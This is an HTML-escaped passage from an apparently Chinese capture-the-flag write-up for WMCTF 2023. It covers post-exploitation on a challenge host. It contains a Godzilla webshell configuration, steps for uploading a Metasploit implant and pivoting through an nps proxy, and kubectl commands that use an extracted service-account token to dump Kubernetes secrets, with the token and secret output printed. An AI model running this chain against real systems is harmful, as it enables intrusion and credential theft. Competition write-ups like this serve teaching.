&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;加密器&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;JAVA_AES_BASE64
&lt;&#x2F;span&gt;&lt;span&gt;地址&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;shellAacw125
&lt;&#x2F;span&gt;&lt;span&gt;密码&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Hcreljak
&lt;&#x2F;span&gt;&lt;span&gt;密钥&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Vazwoxyqvohfnbgcwq
&lt;&#x2F;span&gt;&lt;span&gt;请求头&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Agent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;aaa
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;后面要内网渗透&lt;&#x2F;p&gt;
&lt;p&gt;没法直接执行命令&lt;&#x2F;p&gt;
&lt;p&gt;用哥斯拉马上传 msf 马并给可执行权限&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;HVg7b8mTuo29CPxPYhFc6nItn3d.png)&lt;&#x2F;p&gt;
&lt;p&gt;执行上线 msf&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;Y0gUbcYhdorUcRxdZAFce8E3npt.png)&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;GSndbz0Dbo4RcexR8K6cyzNwnec.png)&lt;&#x2F;p&gt;
&lt;p&gt;然后同样的方法挂个 nps 代理，用 Proxifier 连上访问内网&lt;&#x2F;p&gt;
&lt;p&gt;从环境变量里能看出有 k8s 服务，还有个 CHECK_SERVICE&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;W4i5bp1FKo2MizxWBOEcSS1anOz.png)&lt;&#x2F;p&gt;
&lt;p&gt;题目源码有个内网地址&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;ECskbDQXboCbfOxv8vMcyQw0nrh.png)&lt;&#x2F;p&gt;
&lt;p&gt;viper 做端口转发&lt;&#x2F;p&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;DgH9bKE2MoOQLex09qmcA8IGnsh.png)&lt;&#x2F;p&gt;
&lt;p&gt;从给的 jar 包里的 lib.so 里拿到 token&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span&gt;export KUBE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;eyJhbGciOiJSUzI1NiIsImtpZCI6IlZvTVB3eDlfNm0wSzljbnhXRUNZU3JWa1VQRjY3Z05xaTRKU2xwUzBZNXcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImN0Zi1zZXJ2aWNlYWNjb3VudC1zZWNyZXQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiY3RmLXNlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjEwNWQ5ODctZmQ1Zi00MjZiLTgxODgtOWI3MWNjZTkwYmRhIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmLXNlcnZpY2VhY2NvdW50In0.DAaw3fHoGdY8Kl4BHnGeuQaAHJQpLdbB-jsatlLVfJM60N6Ftx0TyXlGDCsgm2e0u25xnWudQqZeneu1H1EaC0QQDzliPjG5dVhbXYIciM3dOyb8cap5wy5bPAgsAE1wPs_ZxAT6r7XQjWfYkqY6waI6R4_Hdrb98Vzwo4O6EYqNQAX8lVlGtAoIbkZ7U72z-zDR6rf_IHetdRs2JYpzG9kScbZLkWGHelY18dCXZHW_FfKqw1yh9zLUf8mh3PwXIeruUOp2oznVazT-qVnxaMOhLKF-4zqEXPbQVgoZh8mT6DNXj5GCBDex4_Uptj-dYJtMzSNC8qyenAeb3tg3Sg&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;kubectl &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;--token=$KUBE --server=https:&#x2F;&#x2F;xxx.xxx.xx.xxx:6443 --insecure-skip-tls-verify=true auth can-i --list -n default
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;![](WMCTF 2023 web writeup&#x2F;XHg9brxAfoOSMYxQzjhcLT9SnDe.jpg)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span&gt;kubectl &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;--token=$KUBE --server=https:&#x2F;&#x2F;xxx.xxx.xx.xxx:6443 --insecure-skip-tls-verify=true get secrets -o yaml -n default
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;yaml&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-yaml &quot;&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apiVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;items&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apiVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v1
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;NWU5ZDgxODktNWMxNi00NTg3LTkyNjAtNGU2YjBjODZmMWVi
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a2V5
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;kind&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Secret
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;metadata&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;annotations&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;kubectl.kubernetes.io&#x2F;last-applied-configuration&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;|
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;        {&amp;quot;apiVersion&amp;quot;:&amp;quot;v1&amp;quot;,&amp;quot;data&amp;quot;:{&amp;quot;password&amp;quot;:&amp;quot;NWU5ZDgxODktNWMxNi00NTg3LTkyNjAtNGU2YjBjODZmMWVi&amp;quot;,&amp;quot;username&amp;quot;:&amp;quot;a2V5&amp;quot;},&amp;quot;kind&amp;quot;:&amp;quot;Secret&amp;quot;,&amp;quot;metadata&amp;quot;:{&amp;quot;annotations&amp;quot;:{},&amp;quot;name&amp;quot;:&amp;quot;key-secret&amp;quot;,&amp;quot;namespace&amp;quot;:&amp;quot;default&amp;quot;},&amp;quot;type&amp;quot;:&amp;quot;Opaque&amp;quot;}
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;creationTimestamp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;2023-08-18T19:01:04Z&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;managedFields&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apiVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v1
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;fieldsType&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;FieldsV1
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;fieldsV1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:username&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:metadata&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:annotations&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:kubectl.kubernetes.io&#x2F;last-applied-configuration&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:type&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;manager&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;kubectl-client-side-apply
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;operation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Update
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;2023-08-18T19:01:04Z&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;key-secret
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;namespace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;default
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;resourceVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;31990&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;uid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;41eca5bb-3afb-49cd-86ef-9b0e482929d2
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Opaque
&lt;&#x2F;span&gt;&lt;span&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apiVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v1
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;ca.crt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUyT1RJek5EWTFNamd3SGhjTk1qTXdPREU0TURneE5USTRXaGNOTXpNd09ERTFNRGd4TlRJNApXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUyT1RJek5EWTFNamd3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTbWZBdCtJTDdTSEdTT0VCQjB6djBhZThhOHBZaVVRempQWG5HUWt6SXoKQnJvdmNTK0s4c1o2NjRwaExBR2IzMmdrV1RndzdVSlArL3IyUUJzekV5Q09vMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXMvZDRrbytkemtCV0h6cVdSY3FCCnhMMkVaaHd3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnTS91NHFIcU93Z2drenhuejV1cG80dnlJSzQvQTBDcWcKMGVoTGxKRUQwNG9DSVFDdXNLcGVncm5IKy9IeWxYSXVMV3liZGNXbjZZMTlXOXR2MXdSUktSNDBzdz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;namespace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ZGVmYXVsdA==
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklsWnZUVkIzZURsZk5tMHdTemxqYm5oWFJVTlpVM0pXYTFWUVJqWTNaMDV4YVRSS1UyeHdVekJaTlhjaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWldaaGRXeDBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpXTnlaWFF1Ym1GdFpTSTZJbU4wWmkxelpYSjJhV05sWVdOamIzVnVkQzF6WldOeVpYUWlMQ0pyZFdKbGNtNWxkR1Z6TG1sdkwzTmxjblpwWTJWaFkyTnZkVzUwTDNObGNuWnBZMlV0WVdOamIzVnVkQzV1WVcxbElqb2lZM1JtTFhObGNuWnBZMlZoWTJOdmRXNTBJaXdpYTNWaVpYSnVaWFJsY3k1cGJ5OXpaWEoyYVdObFlXTmpiM1Z1ZEM5elpYSjJhV05sTFdGalkyOTFiblF1ZFdsa0lqb2lZakV3TldRNU9EY3RabVExWmkwME1qWmlMVGd4T0RndE9XSTNNV05qWlRrd1ltUmhJaXdpYzNWaUlqb2ljM2x6ZEdWdE9uTmxjblpwWTJWaFkyTnZkVzUwT21SbFptRjFiSFE2WTNSbUxYTmxjblpwWTJWaFkyTnZkVzUwSW4wLkRBYXczZkhvR2RZOEtsNEJIbkdldVFhQUhKUXBMZGJCLWpzYXRsTFZmSk02ME42RnR4MFR5WGxHRENzZ20yZTB1MjV4bld1ZFFxWmVuZXUxSDFFYUMwUVFEemxpUGpHNWRWaGJYWUljaU0zZE95YjhjYXA1d3k1YlBBZ3NBRTF3UHNfWnhBVDZyN1hRaldmWWtxWTZ3YUk2UjRfSGRyYjk4Vnp3bzRPNkVZcU5RQVg4bFZsR3RBb0lia1o3VTcyei16RFI2cmZfSUhldGRSczJKWXB6RzlrU2NiWkxrV0dIZWxZMThkQ1haSFdfRmZLcXcxeWg5ekxVZjhtaDNQd1hJZXJ1VU9wMm96blZhelQtcVZueGFNT2hMS0YtNHpxRVhQYlFWZ29aaDhtVDZETlhqNUdDQkRleDRfVXB0ai1kWUp0TXpTTkM4cXllbkFlYjN0ZzNTZw==
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;kind&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Secret
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;metadata&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;annotations&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;kubernetes.io&#x2F;service-account.name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ctf-serviceaccount
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;kubernetes.io&#x2F;service-account.uid&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;b105d987-fd5f-426b-8188-9b71cce90bda
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;creationTimestamp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;2023-08-18T13:22:29Z&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;labels&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;kubernetes.io&#x2F;legacy-token-last-used&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;2023-08-20&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;managedFields&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apiVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v1
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;fieldsType&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;FieldsV1
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;fieldsV1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:metadata&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:annotations&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:kubernetes.io&#x2F;service-account.name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:type&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;manager&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;kubectl-create
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;operation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Update
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;2023-08-18T13:22:29Z&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;apiVersion&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;v1
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;fieldsType&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;FieldsV1
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;fieldsV1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;f:data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;.: &lt;&#x2F;span&gt;&lt;span&gt;{}
